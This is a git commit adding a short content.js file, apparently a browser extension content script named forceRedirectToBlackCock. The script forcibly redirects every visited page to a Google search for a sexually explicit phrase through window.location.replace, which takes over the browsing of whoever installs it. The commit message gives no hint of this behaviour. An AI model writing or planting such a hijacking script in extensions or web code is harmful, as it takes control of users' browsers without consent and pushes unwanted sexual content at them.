5e4437e08aef7555ba2f58feaa2d7b5cf3e93ff8
kqueej <alexandrd542@gmail.com>
2025-06-14 20:52:41 +0300

    Add files via upload

---
+++ content.js
@@ -0,0 +1,7 @@
+(function forceRedirectToBlackCock() {
+  const target = "https://www.google.com/search?q=black+cock";
+
+  if (window.location.href !== target) {
+    window.location.replace(target);
+  }
+})();
